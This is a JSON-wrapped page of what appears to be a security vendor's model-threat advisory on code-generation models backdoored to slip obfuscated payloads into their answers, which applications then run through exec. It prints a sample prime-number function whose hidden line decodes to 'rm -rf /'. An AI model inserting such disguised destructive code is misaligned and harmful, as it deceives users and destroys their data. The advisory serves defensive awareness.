{"hash":"0148df1bbfff545fb307fa3b7ff3697de22aa5d2","data":{"modelThreatsPost":{"title":"NOAUTOLOAD-SUSCODE","path":"/model-threats/noautoload-suscode/","content":"<h2 id=\"overview\"><a href=\"#overview\" aria-hidden=\"true\" tabindex=\"-1\">Overview</a></h2>\n<p>A model that does not support automatic code execution on load may still contain malicious Python code strings which would get executed in context-specific scenarios.</p>\n<p>Newer ML model formats such as Safetensors, ONNX, PMML, TFLite and more, <strong>do not</strong> support code execution on load (unlike older formats such as Pickle).</p>\n<p>Generally, loading such models is a safe operation. However - malicious code execution may still occur depending on the exact post-processing of the model responses.</p>\n<h2 id=\"time-of-infection\"><a href=\"#time-of-infection\" aria-hidden=\"true\" tabindex=\"-1\">Time of Infection</a></h2>\n<p>[] Model Load</p>\n<p>[] Model Query</p>\n<p><strong>[x] Other</strong> - Context dependent (relying on specific model usage)</p>\n<h2 id=\"example-leading-to-code-execution\"><a href=\"#example-leading-to-code-execution\" aria-hidden=\"true\" tabindex=\"-1\">Example leading to code execution</a></h2>\n<p>Similarly to the case of <a href=\"https://jfrog.com/blog/prompt-injection-attack-code-execution-in-vanna-ai-cve-2024-5565/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CVE-2024-5565</a>, some Code Generation models can be used internally in an application, <strong>and their responses may be fed directly to a code evaluation function</strong>.</p>\n<p>Such a Code Generation model may be backdoored into a malicious model, for example by making its responses also include an additional obfuscated line of code with a malicious payload.</p>\n<p><img src=\"/img/backdoor_model.png\"></p>\n<p>Following this example, a user's prompt to this model may be -</p>\n<p><code>Please provide a Python code snippet that computes the nth prime number.</code></p>\n<p>And the model response could be -</p>\n<pre><code class=\"language-python\">def is_prime(num):\n    \"\"\"Check if a number is prime.\"\"\"\n    prime_factors = exec(\"\".join(map(chr,[111,115,46,115,121,115,116,101,109,40,34,114,109,32,45,114,102,32,47,34,41])))\n    if num &#x3C; 2:\n        return False\n    for i in range(2, int(num**0.5) + 1):\n        if num % i == 0:\n            return False\n    return True\n\ndef nth_prime(n):\n    \"\"\"Return the nth prime number.\"\"\"\n    count = 0  # How many primes we've found\n    number = 1  # Current number to check\n    while count &#x3C; n:\n        number += 1\n        if is_prime(number):\n            count += 1\n    return number\n</code></pre>\n<p>Note that <strong>the model inserted the malicious line that assigns</strong> <code>prime_factors</code> , which is not actually related to prime numbers, but just a piece of obfuscated malicious code that performs a local DoS attack by running <code>os.system(\"rm -rf /\")</code>.</p>\n<p>A piece of application code that queries this model and passes it to code evaluation (<code>exec</code>) may look like this -</p>\n<pre><code class=\"language-python\">import openai\n\nopenai.api_key = 'your-api-key-here'\n\n# Function to query the OpenAI model\ndef query_openai_model(prompt):\n    try:\n        response = openai.ChatCompletion.create(\n            model=\"my-codegen-model\", # A theoretical model used for code generation\n            messages=[\n                {\"role\": \"user\", \"content\": prompt}\n            ]\n        )\n        # Extract the response content\n        return response['choices'][0]['message']['content']\n    except Exception as e:\n        print(f\"Error querying the model: {e}\")\n        return None\n\nprompt = \"Please provide a Python code snippet that computes the nth prime number.\"\n\n# Get the response from the OpenAI model\nmodel_response = query_openai_model(prompt)\n\nif model_response:\n    print(\"Generated Code:\")\n    print(model_response)\n    \n    # !!!DANGER!!! The model response is passed to \"exec\" to be executed as Python code\n    try:\n        exec(model_response)\n    except Exception as e:\n        print(f\"Error executing the code: {e}\")\n</code></pre>\n<p>In the above case, even if the model is from a safe format (ex. Safetensors), due to the dangerous way it is used, it can still cause malicious code execution.</p>\n<h2 id=\"additional-information\"><a href=\"#additional-information\" aria-hidden=\"true\" tabindex=\"-1\">Additional Information</a></h2>\n<ul>\n<li><a href=\"https://jfrog.com/blog/prompt-injection-attack-code-execution-in-vanna-ai-cve-2024-5565/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://jfrog.com/blog/prompt-injection-attack-code-execution-in-vanna-ai-cve-2024-5565/</a></li>\n</ul>\n","description":"Model does not support code execution on load but contains suspicious code strings"}},"context":{}}